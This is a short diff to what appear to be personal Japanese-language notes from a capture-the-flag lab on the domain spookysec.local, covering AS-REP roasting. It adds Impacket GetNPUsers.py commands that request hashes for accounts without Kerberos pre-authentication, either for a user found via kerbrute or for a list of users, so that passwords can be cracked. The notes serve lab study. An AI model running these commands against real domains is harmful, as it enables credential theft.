@@ -1934,9 +1934,16 @@ allow us to query ASReproastable accounts from the Key Distribution Center.
 ASREPRoasting: DONT_REQ_PREAUTH というのがenabled になっているアカウント(svc-admin, backup など)でrequest をおこなえば、preauth がおこらない。ゆえに、そのresponse でhashを取得できれば、password を取得できる。
 
 
-
 ```
+
+・userを上のkerbrute userenumでひっかけた場合
+
+GetNPUsers.py -dc-ip 10.10.108.200 spookysec.local/svc-admin -no-pass
+
+・それ以外の場合
 python3 /home/kali/.local/bin/GetNPUsers.py -dc-ip 10.10.176.6 spookysec.local/ -usersfile user.txt 
+
+
 ```
 
 
